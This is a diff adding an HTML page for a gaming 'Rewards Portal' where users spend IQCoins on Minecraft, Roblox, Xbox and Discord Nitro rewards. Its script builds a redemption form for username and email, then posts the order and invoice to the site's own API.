@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>Coin Rewards — Rewards Portal</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin/>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-7987227753889488" crossorigin="anonymous"></script>
+<meta name="google-adsense-account" content="ca-pub-7987227753889488"/>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
+<link rel="stylesheet" href="shared.css"/>
+<style>
+.ad-slot{background:var(--bg2);border:1px dashed var(--border2);border-radius:var(--r2);padding:20px;text-align:center;margin:28px 0;min-height:90px;display:flex;align-items:center;justify-content:center;color:var(--t4);font-size:12px}
+.bal-bar{display:flex;align-items:center;gap:20px;background:linear-gradient(135deg,rgba(245,158,11,0.07),rgba(245,158,11,0.03));border:1px solid rgba(245,158,11,0.2);border-radius:var(--r3);padding:22px 28px;margin-bottom:28px}
+.bal-n{font-family:'Fraunces',serif;font-size:40px;font-weight:600;letter-spacing:-2px;color:#b45309}
+.bal-l{font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.09em;color:var(--t3);margin-top:4px}
+</style>
+</head>
+<body>
+<div class="bg-mesh"><div class="bg-orb o1"></div><div class="bg-orb o2"></div><div class="bg-orb o3"></div><div class="bg-grid"></div></div>
+<nav>
+  <div class="nav-inner">
+    <a class="brand" href="index.html"><div class="brand-mark">IQ</div><span class="brand-name">Rewards<span>Portal</span></span></a>
+    <div class="nav-tabs">
+      <button class="ntab" onclick="location.href='index.html'">Home</button>
+      <button class="ntab" onclick="location.href='earn.html'">Earn Coins</button>
+      <button class="ntab" onclick="location.href='redeem.html'">Redeem Code</button>
+      <button class="ntab active" onclick="location.href='coins.html'">Coin Rewards</button>
+      <button class="ntab" onclick="location.href='giveaway.html'">Giveaways</button>
+      <button class="ntab" onclick="location.href='profile.html'">Profile</button>
+      <button class="ntab" onclick="location.href='track.html'">Track Order</button>
+      <button class="ntab" onclick="location.href='howitworks.html'">How It Works</button>
+      <button class="ntab" onclick="location.href='about.html'">About</button>
+      <button class="ntab" onclick="location.href='contact.html'">Contact</button>
+    </div>
+    <div class="nav-right">
+      <div class="coin-pill" id="cpill" onclick="location.href='earn.html'">🪙 <span id="nav-coins">0</span></div>
+      <div id="nav-auth"></div>
+      <button class="hamburger" id="hbgBtn"><span></span><span></span><span></span></button>
+    </div>
+  </div>
+</nav>
+<div class="mob-nav" id="mobNav">
+  <button class="ntab" onclick="location.href='index.html'">🏠 Home</button>
+  <button class="ntab" onclick="location.href='earn.html'">🪙 Earn IQCoins</button>
+  <button class="ntab" onclick="location.href='redeem.html'">🎫 Redeem Code</button>
+  <button class="ntab" onclick="location.href='coins.html'">💰 Coin Rewards</button>
+  <button class="ntab" onclick="location.href='giveaway.html'">🎉 Giveaways</button>
+  <button class="ntab" onclick="location.href='profile.html'">👤 Profile</button>
+  <button class="ntab" onclick="location.href='track.html'">📦 Track Order</button>
+  <button class="ntab" onclick="location.href='howitworks.html'">❓ How It Works</button>
+  <button class="ntab" onclick="location.href='about.html'">ℹ️ About Us</button>
+  <button class="ntab" onclick="location.href='contact.html'">📩 Contact</button>
+</div>
+
+<div class="wrap-md page-body">
+  <div class="page-hero">
+    <div class="chip">🪙 Coin Rewards</div>
+    <h1>Spend <span>IQCoins</span></h1>
+    <p>Exchange your IQCoins for real gaming rewards — no code needed.</p>
+  </div>
+
+  <div class="bal-bar">
+    <span style="font-size:40px;animation:floatY 3s ease-in-out infinite">🪙</span>
+    <div><div class="bal-n" id="coins-bal">0</div><div class="bal-l">Available IQCoins</div></div>
+    <div style="margin-left:auto"><a class="btn btn-gold" href="earn.html" style="text-decoration:none">Earn More →</a></div>
+  </div>
+
+  <ins class="adsbygoogle ad-slot" style="display:block" data-ad-client="ca-pub-7987227753889488" data-ad-slot="auto" data-ad-format="horizontal" data-full-width-responsive="true"></ins>
+
+  <div class="rtiles">
+    <div class="rtile" onclick="cRedeem('mc',899000,'Minecraft Reward','mc','Rs.899')">
+      <div class="rtile-glow" style="background:var(--gr)"></div>
+      <span class="rtile-icon">⛏</span>
+      <span class="rtile-badge" style="background:var(--grg);border:1px solid rgba(16,185,129,0.2);color:var(--gr)">Minecraft</span>
+      <div class="rtile-name">Minecraft Reward</div>
+      <div class="rtile-desc">Server exclusive Minecraft reward.</div>
+      <div class="rtile-price">🪙 899,000 IQCoins</div>
+      <div class="rtile-inr">≈ ₹899</div>
+      <span class="rtile-cta">Redeem →</span>
+    </div>
+    <div class="rtile" onclick="cRedeem('rb50',799000,'Roblox $50 Plan','rb','Rs.1,499')">
+      <div class="rtile-glow" style="background:var(--re)"></div>
+      <span class="rtile-icon">🎮</span>
+      <span class="rtile-badge" style="background:var(--reg);border:1px solid rgba(239,68,68,0.2);color:var(--re)">Roblox $50</span>
+      <div class="rtile-name">Roblox $50 Plan</div>
+      <div class="rtile-desc">$50 plan credits added to your account.</div>
+      <div class="rtile-price">🪙 799,000 IQCoins</div>
+      <div class="rtile-inr">≈ ₹1,499</div>
+      <span class="rtile-cta">Redeem →</span>
+    </div>
+    <div class="rtile" onclick="cRedeem('rb100',999000,'Roblox $100 Plan','rb','Rs.2,499')">
+      <div class="rtile-glow" style="background:var(--re)"></div>
+      <span class="rtile-icon">🎮</span>
+      <span class="rtile-badge" style="background:var(--reg);border:1px solid rgba(239,68,68,0.2);color:var(--re)">Roblox $100</span>
+      <div class="rtile-name">Roblox $100 Plan</div>
+      <div class="rtile-desc">$100 plan credits for your account.</div>
+      <div class="rtile-price">🪙 999,000 IQCoins</div>
+      <div class="rtile-inr">≈ ₹2,499</div>
+      <span class="rtile-cta">Redeem →</span>
+    </div>
+    <div class="rtile" onclick="cRedeem('xbox',699000,'Xbox Game Pass','xbox','Rs.1,999')">
+      <div class="rtile-glow" style="background:var(--gr)"></div>
+      <span class="rtile-icon">🎯</span>
+      <span class="rtile-badge" style="background:var(--grg);border:1px solid rgba(16,185,129,0.2);color:var(--gr)">Xbox</span>
+      <div class="rtile-name">Xbox Game Pass</div>
+      <div class="rtile-desc">Ultimate activation for your account.</div>
+      <div class="rtile-price">🪙 699,000 IQCoins</div>
+      <div class="rtile-inr">≈ ₹1,999</div>
+      <span class="rtile-cta">Redeem →</span>
+    </div>
+    <div class="rtile" onclick="cRedeem('nitrobasic',599000,'Discord Nitro Basic Yearly','nitro','Rs.1,199')">
+      <div class="rtile-glow" style="background:var(--dc)"></div>
+      <span class="rtile-icon">💎</span>
+      <span class="rtile-badge" style="background:var(--dcg);border:1px solid rgba(88,101,242,0.2);color:var(--dc)">Basic Yearly</span>
+      <div class="rtile-name">Nitro Basic</div>
+      <div class="rtile-desc">Nitro Basic yearly plan gifted to account.</div>
+      <div class="rtile-price">🪙 599,000 IQCoins</div>
+      <div class="rtile-inr">≈ ₹1,199/yr</div>
+      <span class="rtile-cta">Redeem →</span>
+    </div>
+    <div class="rtile" onclick="cRedeem('nitroboost',2999000,'Discord Nitro Boost Yearly','nitro','Rs.5,999')">
+      <div class="rtile-glow" style="background:var(--dc)"></div>
+      <span class="rtile-icon">💎</span>
+      <span class="rtile-badge" style="background:var(--dcg);border:1px solid rgba(88,101,242,0.2);color:var(--dc)">Boost Yearly</span>
+      <div class="rtile-name">Nitro Boost</div>
+      <div class="rtile-desc">Nitro Boost yearly + 2 server boosts gifted.</div>
+      <div class="rtile-price">🪙 2,999,000 IQCoins</div>
+      <div class="rtile-inr">≈ ₹5,999/yr</div>
+      <span class="rtile-cta">Redeem →</span>
+    </div>
+  </div>
+
+  <!-- COIN REDEEM AREA -->
+  <div id="coin-area" style="display:none">
+    <div class="card" id="coin-card">
+      <div class="card-line" id="coin-cline"></div>
+      <button onclick="document.getElementById('coin-area').style.display='none'" style="background:none;border:none;color:var(--t3);font-size:13px;cursor:pointer;margin-bottom:16px;font-family:'DM Sans',sans-serif;padding:0">← Back</button>
+      <div id="coin-inner"></div>
+    </div>
+    <div class="scard" id="coin-ok">
+      <div class="sico" style="background:var(--grg);border:2px solid rgba(16,185,129,0.2);color:var(--gr)">✅</div>
+      <div class="stitle" id="coin-ok-ttl">Redeemed!</div>
+      <p class="sdesc">Your reward is queued and will be activated within <strong>72 hours</strong>.</p>
+      <div id="coin-ok-inv"></div>
+      <div class="timrow" style="margin-top:16px">⏱ Activates within <strong>&nbsp;72 hours</strong></div>
+      <div class="brow" style="margin-top:16px">
+        <button class="btn btn-primary" onclick="dlPDF('coin')">📄 Download Invoice</button>
+        <button class="btn btn-ghost" onclick="location.href='track.html'">Track Order →</button>
+      </div>
+    </div>
+  </div>
+
+  <ins class="adsbygoogle ad-slot" style="display:block" data-ad-client="ca-pub-7987227753889488" data-ad-slot="auto" data-ad-format="rectangle" data-full-width-responsive="true"></ins>
+</div>
+
+<footer>
+  <div class="foot-inner">
+    <div class="foot-brand">Rewards<span>Portal</span></div>
+    <div class="foot-links">
+      <a class="foot-link" href="howitworks.html">How It Works</a>
+      <a class="foot-link" href="about.html">About</a>
+      <a class="foot-link" href="contact.html">Contact</a>
+      <a class="foot-link" href="privacy.html">Privacy</a>
+      <a class="foot-link" href="terms.html">Terms</a>
+    </div>
+    <div class="foot-copy">© 2026 Rewards Portal — All rights reserved</div>
+  </div>
+</footer>
+<div id="toast"></div>
+<script src="shared.js"></script>
+<script>
+(adsbygoogle = window.adsbygoogle || []).push({});
+(adsbygoogle = window.adsbygoogle || []).push({});
+const CI = { inv: null };
+window.CI = CI;
+document.addEventListener('DOMContentLoaded', () => {
+  const cb = document.getElementById('coins-bal');
+  if (cb) cb.textContent = getCoins().toLocaleString();
+});
+
+function cRedeem(key, cost, name, type, inrPrice) {
+  const u = getUser();
+  if (!u) { toast('!', 'Please login with Discord first'); return; }
+  if (getCoins() < cost) { toast('✕', `Need ${(cost - getCoins()).toLocaleString()} more IQCoins`); return; }
+  const colors = { mc:'var(--gr)', rb:'var(--re)', xbox:'var(--gr)', nitro:'var(--dc)' };
+  const line = document.getElementById('coin-cline');
+  if (line) line.style.background = `linear-gradient(90deg,${colors[type]||'var(--p)'},transparent)`;
+  const plan = key==='rb50'?'$50':key==='rb100'?'$100':null;
+  document.getElementById('coin-inner').innerHTML = buildCoinForm(key, cost, name, type, inrPrice, plan, colors[type]);
+  document.getElementById('coin-area').style.display = 'block';
+  document.getElementById('coin-ok').classList.remove('show');
+  document.getElementById('coin-card').style.display = 'block';
+  document.getElementById('coin-area').scrollIntoView({ behavior:'smooth' });
+}
+
+function buildCoinForm(key, cost, name, type, inrPrice, plan, color) {
+  const needAccount = type === 'rb' || type === 'nitro';
+  return `<h3 style="color:${color||'var(--p)'}">${name}</h3>
+  <p>You'll spend <strong style="color:#b45309">🪙 ${cost.toLocaleString()} IQCoins</strong> — your balance: <strong>${getCoins().toLocaleString()}</strong></p>
+  ${needAccount ? `
+  <div class="notice nw"><div class="nt">⚠️ Important</div><p>Enter the exact account details — reward will be delivered only to this account.</p></div>
+  <div class="field"><label>${type==='nitro'?'Discord Username':'Account Username'}</label><input class="inp" id="ci-un" type="text" placeholder="Your exact username"/></div>
+  <div class="field"><label>Email linked to account</label><input class="inp" id="ci-em" type="email" placeholder="your@email.com"/></div>
+  ` : `
+  <div class="notice ng"><div class="nt">✓ Account Linked</div><p>Reward will be delivered to your Discord account: <strong>${getUser()?.global_name||getUser()?.username||'Unknown'}</strong></p></div>
+  `}
+  <button class="btn btn-primary btn-full" id="ci-btn" onclick="cSubmit('${key}',${cost},'${name}','${type}','${inrPrice}','${plan||''}','${color||'var(--p)'}')" style="padding:16px"><span id="ci-bt">Confirm Redemption — ${cost.toLocaleString()} IQCoins</span><div class="bspin" id="ci-sp" style="display:none"></div></button>`;
+}
+
+function cSubmit(key, cost, name, type, inrPrice, plan, color) {
+  const u = getUser();
+  if (!u) { toast('!', 'Login required'); return; }
+  let account = u.global_name || u.username; let email = u.email || '';
+  if (type === 'rb' || type === 'nitro') {
+    const un = document.getElementById('ci-un')?.value.trim();
+    const em = document.getElementById('ci-em')?.value.trim();
+    if (!un) { document.getElementById('ci-un')?.classList.add('err'); toast('!','Enter username'); return; }
+    if (!em || !em.includes('@')) { document.getElementById('ci-em')?.classList.add('err'); toast('!','Enter valid email'); return; }
+    account = un; email = em;
+  }
+  if (!spendCoins(cost)) return;
+  const cb = document.getElementById('coins-bal'); if (cb) cb.textContent = getCoins().toLocaleString();
+  const btn = document.getElementById('ci-btn'); const bt = document.getElementById('ci-bt'); const sp = document.getElementById('ci-sp');
+  if (btn) { btn.disabled=true; bt.style.display='none'; sp.style.display='block'; }
+  const inv = 'IQ-'+type.slice(0,2).toUpperCase()+'-'+Date.now().toString(36).toUpperCase().slice(-7);
+  const ds = new Date().toLocaleString('en-IN',{day:'numeric',month:'long',year:'numeric',hour:'2-digit',minute:'2-digit'});
+  const invObj = { redeemType:'coins', type, game:name, plan:plan||null, account, email, password:'', coinsSpent:cost, inrPrice, date:ds, invoiceNo:inv, ts:Date.now() };
+  CI.inv = invObj; saveOrd(invObj);
+  localStorage.setItem('eiq_rc', String(parseInt(localStorage.getItem('eiq_rc')||'0')+1));
+  fetch(`${CFG.API}/api/spend-coins`, { method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({userId:u.id, userName:u.global_name||u.username, userAvatar:avURL(u), amount:cost, gameKey:key, invoiceNo:inv})
+  }).catch(()=>{});
+  fetch(`${CFG.API}/api/save-redemption`, { method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({userId:u.id, userName:u.global_name||u.username, userAvatar:avURL(u), discordTag:u.username,
+      game:invObj.game, plan:invObj.plan||null, account:invObj.account, email:invObj.email, password:'',
+      coinsSpent:invObj.coinsSpent, inrPrice:invObj.inrPrice, invoiceNo:invObj.invoiceNo, redeemType:'coins', date:invObj.date, ts:invObj.ts})
+  }).catch(()=>{});
+  document.getElementById('coin-ok-ttl').textContent = name + ' Queued!';
+  document.getElementById('coin-ok-inv').innerHTML = buildInv(invObj);
+  document.getElementById('coin-card').style.display = 'none';
+  document.getElementById('coin-ok').classList.add('show');
+  if (btn) { btn.disabled=false; bt.style.display='inline'; sp.style.display='none'; }
+  toast('🪙', `Redeemed! ${cost.toLocaleString()} coins spent`);
+}
+</script>
+</body>
+</html>
